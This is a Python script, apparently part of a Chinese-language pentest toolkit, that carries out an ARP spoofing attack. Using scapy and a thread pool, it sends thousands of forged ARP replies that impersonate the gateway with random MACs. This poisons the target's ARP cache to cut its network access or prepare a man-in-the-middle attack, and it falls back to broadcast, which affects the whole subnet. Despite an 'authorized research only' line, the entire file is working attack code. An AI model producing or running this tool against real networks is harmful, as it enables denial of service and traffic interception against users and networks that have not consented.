#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : python
@File : arp_attack.py
@Author : moresuo
@Time : 2026/6/29
@脚本说明 : ARP 欺骗攻击（伪装网关向靶机发送大量 ARP 响应）

向靶机发送大量 ARP 响应（is-at），psrc 伪装成网关 IP、hwsrc 每包使用
随机 MAC，污染靶机 ARP 缓存，使其发往网关的流量指向无效 MAC，造成断网
或为中间人攻击建立前提。仅用于授权安全研究。

注意：ARP 为二层协议，攻击机必须与靶机同网段；Windows 需 Npcap 且通常需
管理员权限发包。
"""
import sys
import threading
import concurrent.futures
import warnings

from alive_progress import alive_bar
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC

from tools.color import console
from tools.ip_scan import resolve_iface

warnings.filterwarnings("ignore")


def _infer_gateway(target_ip):
    """推断网关 IP：取靶机同网段的 .1（常见网关地址）。"""
    parts = target_ip.split(".")
    if len(parts) == 4 and all(parts):
        return ".".join(parts[:3]) + ".1"
    return None


def _resolve_target_mac(target_ip, dev):
    """预先解析靶机 MAC（getmacbyip 失败回退广播地址）。

    避免在发包循环中重复调用 getmacbyip（其本身会发 ARP 请求，开销大且不稳）。
    """
    try:
        mac = getmacbyip(target_ip)
        if mac and mac != "ff:ff:ff:ff:ff:ff":
            return mac
    except Exception:
        pass
    return "ff:ff:ff:ff:ff:ff"


def arp_attack_run(target_ip, gateway_ip=None, num=10000, iface=None, threads=200):
    """ARP 欺骗攻击入口。

    Args:
        target_ip:  靶机 IP（攻击机需与之同网段）
        gateway_ip: 伪装的网关 IP，None 时自动推断同网段 .1
        num:        发送 ARP 响应包数量（默认 10000）
        iface:      指定网卡 名称/描述/IP，None 时按靶机网段自动选择
        threads:    并发发包线程数（收敛到合理值，不随 num 线性增长）
    """
    from rich.panel import Panel

    # ── 网卡解析：自动按靶机网段选，或用户指定 ──
    dev = resolve_iface(iface, target_ip)
    if dev is None:
        console.print(
            f"[fail]✗ 无法确定发包网卡[/fail] "
            f"[dim]（靶机 {target_ip} 无同网段网卡，请用 -I/--iface 指定网卡名称/描述）[/dim]"
        )
        return

    # ── 网关 IP：用户指定或推断 ──
    if not gateway_ip:
        gateway_ip = _infer_gateway(target_ip)
        if not gateway_ip:
            console.print(f"[fail]✗ 无法推断网关 IP，请用 -g/--gateway 指定[/fail]")
            return

    # ── 靶机 MAC 预解析 ──
    target_mac = _resolve_target_mac(target_ip, dev)
    mac_ok = target_mac != "ff:ff:ff:ff:ff:ff"
    if not mac_ok:
        console.print(f"[warn]⚠ 未解析到靶机 MAC，将以广播地址发送（影响同网段所有主机）[/warn]")

    console.print(Panel.fit(
        f"[accent]靶机[/accent]      [host]{target_ip}[/host] [dim]({target_mac})[/dim]\n"
        f"[accent]伪装网关[/accent]    [highlight]{gateway_ip}[/highlight] [dim](随机MAC)[/dim]\n"
        f"[accent]网卡[/accent]      [highlight]{dev.description}[/highlight] [dim]({dev.ip})[/dim]\n"
        f"[accent]发包数[/accent]    [count]{num}[/count]",
        title="[header]ARP 欺骗攻击[/header]",
        border_style="warn",
    ))

    sent = [0]
    sent_lock = threading.Lock()

    def _send_one(_):
        # 每包独立随机 MAC 作为伪装网关 MAC
        fake_mac = str(RandMAC())
        pkt = Ether(src=fake_mac, dst=target_mac) / ARP(
            op="is-at", psrc=gateway_ip, pdst=target_ip,
            hwsrc=fake_mac, hwdst=target_mac,
        )
        try:
            sendp(pkt, iface=dev, verbose=0)
            with sent_lock:
                sent[0] += 1
        except Exception:
            # 宽泛吞异常，保持与项目其他模块一致的容错风格
            pass

    # 线程数收敛：随 num 增长但不超 threads，避免参考脚本 num 级线程爆炸
    workers = min(threads, max(1, num))

    # 进度条：与端口扫描一致，delta 增量推进，输出到 stderr
    _tracked = [0]

    def _on_progress():
        with sent_lock:
            completed = sent[0]
        delta = completed - _tracked[0]
        if delta > 0:
            _bar(delta)
            _tracked[0] = completed

    with alive_bar(
        num,
        title="ARP攻击",
        bar="smooth",
        spinner="dots_waves2",
        enrich_print=False,
        file=sys.__stderr__,
        receipt=True,
        receipt_text="ARP攻击完成",
    ) as _bar:
        # 分批提交 + done_callback 回调进度，避免大 num 一次性创建大量 Future
        batch_size = max(workers * 8, 1)
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for i in range(num):
                fut = executor.submit(_send_one, i)
                fut.add_done_callback(lambda _f: _on_progress())
                futures.append(fut)
                if len(futures) >= batch_size:
                    concurrent.futures.wait(futures)
                    futures.clear()
            if futures:
                concurrent.futures.wait(futures)
        # 收尾：补偿尚未计入的完成量（done_callback 与 wait 间的微小竞态）
        remaining = sent[0] - _tracked[0]
        if remaining > 0:
            _bar(remaining)

    console.print(f"[success]✓ 已发送 {sent[0]} / {num} 个 ARP 响应包[/success]")
